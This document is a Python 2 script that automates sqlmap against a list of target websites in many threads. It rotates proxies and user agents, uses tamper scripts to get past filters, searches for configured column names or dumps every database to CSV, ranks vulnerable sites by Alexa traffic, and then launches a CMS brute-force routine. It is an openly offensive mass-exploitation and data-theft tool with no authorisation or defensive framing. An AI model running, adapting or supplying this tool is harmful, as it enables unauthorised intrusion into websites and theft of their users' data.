#!/usr/bin/env python
#coding: utf-8
from multiprocessing.dummy import Pool
from subprocess import Popen, PIPE, call, check_call
import os
import re
import sys
import bs4
import glob
import time
import shutil
import urllib2
import logging
import urlparse
import traceback
import threading
import builtwith

from random import choice
from urlparse import urlparse
from datetime import datetime

from brutecms import brutecont

from psutil import Process, TimeoutExpired

from requests import get
from requests.exceptions import ReadTimeout, ConnectTimeout


import wrapper_config 


try:
    dump = sys.argv[1]
except:
    dump = wrapper_config.COLUMN_DUMP


DUMP_SQLMAP_FOLDER = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.DUMP_FOLDER)


DUMP_SQLMAP_SAVE = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.SQLMAP_DUMPS)

print DUMP_SQLMAP_SAVE

DUMP_TXT_FOLDER = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.WRAPPER_TXT_DUMPS)

print DUMP_TXT_FOLDER

        
STEPS = [10,100, 300, 500, 1000, 1500, 2000, 3000, 5000, 10000, 20000, 50000, 100000]

#STEPS = [100]


# for alexa

header = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)", "Opera/9.20 (Windows NT 6.0; U; en)", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)", "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0", "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"]



def checkcms(url):
    try:
        cms = builtwith.builtwith(url)
        w = url + " | CMS: " + cms["cms"][0]
    except:
        w = checkencoom(url)
    return w

def checkencoom(url):
    try:
        cms = builtwith.builtwith(url)
        w = url + " | CMS: " + cms["ecommerce"][0]
    except:
        w = "CMS: Not found"
    return w

    
def sqlmap_check(url, pos, check_timeout, proxy=None):
    print('set %s' % url)
    print('left %s url(s)' % pos)
    if proxy:
        print('set proxy %s://%s' % (wrapper_config.PROXY_TYPE, proxy))
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--search',
                '-C %s' % dump,
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--search',
                '-C %s' % dump,
                #'--answers="quit=n, crack=n"'
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                #'--proxy=socks5://localhost:9091',
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',

            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',

            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass

    if check_dump_folder(url):
        save_txt(url)

    dbs_data = log_num_parser(url)
    #print  dbs_data
    #sys.exit()
    
    if dbs_data:
        async_tables_pool = Pool()
        for db, tables in dbs_data.items():
            for table, num in tables.items():
                for step in STEPS: #STEPS = [10,100, 300, 500, 1000, 1500, 2000, 3000, 5000, 10000, 20000, 50000, 100000]
                    if int(num) > step:
                        try:
                            async_tables_pool.apply_async( 
                                    sqlmap_dump(
                                    url,
                                    56000,
                                    proxy))
                        except:pass

                    else:

                        break
        async_tables_pool.close()
        async_tables_pool.join()


def sqlmap_dump(url, check_timeout, proxy=None):
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass


def sqlmap_dump_all(url, pos, check_timeout, proxy=None):
    print "Dump All"
    print('set %s' % url)
    print('left %s url(s)' % pos)
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
    
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired:pass       
        try:
            psu_process.kill()
        except:pass

    if check_dump_folder(url):
        save_txt(url)



def sqli_check(url, pos, check_timeout, proxy=None):
    print "Find SQLi"
    print('set %s' % url)
    print('left %s url(s)' % pos)
    if proxy:
        print('set proxy %s://%s' % (wrapper_config.PROXY_TYPE, proxy))
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % DUMP_SQLMAP_SAVE,
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass

    if check_dump_folder(url):
        save_txt(url)
       


def clean_url(url):
    return url.split("'")[0]


def get_proxies(url):
    try:
        return get(url, timeout=120).text.splitlines()
    except (ConnectTimeout, ReadTimeout):
        print('cant grab proxies %s ; check link' % url)
        sys.exit()


def check_dump_folder(url):
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_dump_folder = os.path.splitext(DUMP_SQLMAP_SAVE + '/' + domains + '/log')[0]
    try:
        print '\n' +  url + ' check'
        if os.path.getsize(domains_dump_folder) > 0:
            open(wrapper_config.SQLi_SAVE_FILE, 'a+').write(str(url) + " " + str(alexa(url)) + '\n')
            del_dub(wrapper_config.SQLi_SAVE_FILE)
            create = str(DUMP_TXT_FOLDER + '/' + domains)
            if not os.path.exists(os.path.dirname(create)):
                print 'Create dir ' + create
                os.makedirs(create)
            return os.path.getsize(domains_dump_folder)
        else:
            if wrapper_config.DELETE == True:
                domains_del_folder = os.path.join(DUMP_SQLMAP_SAVE, domains)
                shutil.rmtree(domains_del_folder)
            return False
    except Exception, error_code:
        print 'check dump ' + str(error_code)
        return False



def save_txt(url):
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_dump_folder = os.path.join(DUMP_SQLMAP_SAVE, domains)
    try:
        create = str(DUMP_TXT_FOLDER + '/' + domains)
        if not os.path.exists(os.path.dirname(create)):
            print 'Create dir ' + create
            os.makedirs(create)
        for root, dirs, files in os.walk(domains_dump_folder):
            for file in files:
                if file == 'log':
                    log_file = open(root + '/' + file)
                    open('log', 'a+').write(root + '\n')
                    for line in log_file:
                        open('log', 'a+').write(line)

                if file.endswith(".csv"):
                    path_file = os.path.join(root,file)
                    res = file.replace('.csv', '.txt')  
                    try:                  
                        shutil.copy(path_file, create + '/' + res)
                    except Exception, error_code:
                        print 'Save txt error: ' + str(error_code)
                        os.makedirs(create)
                        shutil.copy(path_file, create + '/' + res)
                    print  create + '/' + res
    except Exception, error_code:
        print 'Save txt error 1: ' + str(error_code)
        open('save_error.txt', 'a+').write(str(error_code))
        os.makedirs(create)
        shutil.copy(path_file, create + '/' + res)


def alexa(url):
    try:
        req = urllib2.Request("http://data.alexa.com/data?cli=10&dat=s&url=" + url, None, {'User-agent' : choice(header)})
        alexa =  bs4.BeautifulSoup(urllib2.urlopen(req), "lxml").find('reach')['rank']
        return ' | Alexa Rank: ' + alexa
    except Exception, error_code:
        print('Error: ' + str(error_code))
        return ' | Alexa Rank: 0'


def del_dub(file):
    text_file = open(file)
    lines = text_file.read().split('\n')
    lines = list(set(lines))
    lines = list(filter(None, lines))
    open(file, 'w').close()
    for line in lines:
        open(file, 'a+').write(line+'\n')


def sites_dev():
    if wrapper_config.Check_List == True:
        print('Check list target')
        output = []
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            check = re.compile(r'^(?:http)s?://', re.IGNORECASE)
            checks =  re.match(check, url) is not None 
            if len(url) > 0:
                if checks != True:
                    open(wrapper_config.URLS_FILE, 'a+').write('http://' + url + '\n')
                    del_dub(wrapper_config.URLS_FILE)
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            if not "facebook" in url and not "ebay" in url and not "youtube" in url and not "google" in url and not "cxsecurity" in url and not "pastebin" in url and not "amazon" in url and not "microsoft" in url and not "yahoo" in url and "http" in url and len(url) > 0:
                output.append(url + '\n')
        if output:
            f = open(wrapper_config.URLS_FILE, 'w')
            f.writelines(output)
            f.close()
            del_dub(wrapper_config.URLS_FILE)
        if os.stat(wrapper_config.URLS_FILE).st_size == 0:
            print 'No target'
            sys.exit()



dublicates = None

def threads():
    global dublicates
    dublicates = []
    new = False
    try:
        logfile = open(wrapper_config.LOG_FILE).read().splitlines()
    except: new = True
    else:
        if len(logfile) > 2:
            for line in logfile:
                if 'all work done' in line:
                    new = True
        else:
            new = True
    if new:
        if wrapper_config.DEBUG:
            logging.basicConfig(
                level=logging.DEBUG, 
                filename=wrapper_config.LOG_FILE,
                filemode='w')
        print('starting new session')
        try:
            urls = open(wrapper_config.URLS_FILE).read().splitlines()
        except IOError:
            print('cant open %s check file' % wrapper_config.URLS_FILE)
            sys.exit()

    else:
        if wrapper_config.DEBUG:
            logging.basicConfig(
                level=logging.DEBUG, 
                filename=wrapper_config.LOG_FILE,
                filemode='a')
        print('detect previous session, restore')
        try:
            urls = open(wrapper_config.URLS_FILE).read().splitlines()
            #print   urls
        except IOError:
            print('cant open %s check file' % wrapper_config.URLS_FILE)
            sys.exit()
        for line in reversed(logfile):
            if ':set' in line:
                try:
                    lasturl = line.split(':set ')[1]
                    lasturl_index = urls.index(lasturl) + 1
                except: print('cant detect last url %s in task' % lasturl)
                else:
                    print('detect last url in task %s' % lasturl)
                break

    proxies = []
    if wrapper_config.PROXY:
        if wrapper_config.PROXY_FILE:
            proxies = open(wrapper_config.PROXY_FILE).read().splitlines()
            print('get proxies from %s' % wrapper_config.PROXY_FILE)
            
    for lim in range(0, len(urls), wrapper_config.URLS_LIMIT):
        urls_chunk = urls[lim:lim + wrapper_config.URLS_LIMIT]
        pool = Pool(wrapper_config.THREADS)
        for index, url in enumerate(urls_chunk):
            try:
                position = len(urls) - urls.index(url)
            except:
                position = 0

            if wrapper_config.Check_SQLi == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqli_check, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqli_check, (
                        clean_url(url), 
                        position, 56000))

            if wrapper_config.DUMP == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqlmap_check, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqlmap_check, 
                        (clean_url(url), position, 56000))
                    
            if wrapper_config.DUMP_ALL == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqlmap_dump_all, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqlmap_dump_all, 
                        (clean_url(url), position, 56000))


        pool.close()
        pool.join()

    brutecont()

try:
    sites_dev()
    threads()
except KeyboardInterrupt:
    sys.exit() 